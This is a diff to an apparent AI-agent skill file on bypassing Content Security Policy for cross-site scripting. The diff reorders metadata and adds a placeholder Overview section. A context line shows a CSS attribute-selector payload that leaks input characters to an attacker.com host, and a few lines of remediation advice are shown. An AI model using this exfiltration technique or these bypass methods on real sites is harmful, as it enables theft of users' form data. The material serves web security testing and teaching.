@@ -3,7 +3,6 @@ name: performing-content-security-policy-bypass
 description: Analyze and bypass Content Security Policy implementations to achieve cross-site scripting by exploiting misconfigurations,
   JSONP endpoints, unsafe directives, and policy injection techniques.
 domain: cybersecurity
-subdomain: web-application-security
 tags:
 - csp-bypass
 - content-security-policy
@@ -12,6 +11,7 @@ tags:
 - nonce-bypass
 - jsonp
 - policy-misconfiguration
+subdomain: web-application-security
 version: '1.0'
 author: mahipal
 license: Apache-2.0
@@ -271,3 +271,7 @@ input[value^="b"] { background: url("https://attacker.com/?char=b"); }
 - Migrate from unsafe-inline to strict nonce-based policy
 - Implement strict-dynamic for modern CSP3 browsers
 ```
+
+## Overview
+
+> Section content — see SKILL.md body for full details.
